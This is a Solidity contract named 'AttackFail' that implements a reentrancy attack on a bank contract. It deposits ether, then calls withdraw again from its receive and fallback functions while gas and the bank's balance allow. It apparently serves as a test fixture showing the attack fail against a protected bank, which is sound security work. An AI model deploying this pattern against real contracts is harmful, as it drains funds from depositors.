// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {IBank} from "./interfaces/IBank.sol";
import {NotEnoughBalance, CallFailed} from "./interfaces/BankErrors.sol";

contract AttackFail {
    IBank bank;
    uint256 counter = 10;

    constructor(IBank bank_) {
        bank = bank_;
    }

    function deposit() external payable {
        bank.deposit{value: msg.value}();
    }

    function attack() external {
        bank.withdraw(1 ether);
    }

    fallback() external payable {
        _attack();
    }

    receive() external payable {
        _attack();
    }

    event Log(uint256 balance);

    function _attack() internal {
        emit Log(address(this).balance);
        if (gasleft() > 30_000 && address(bank).balance > 0) {
            bank.withdraw(1 ether);
        }
    }
}
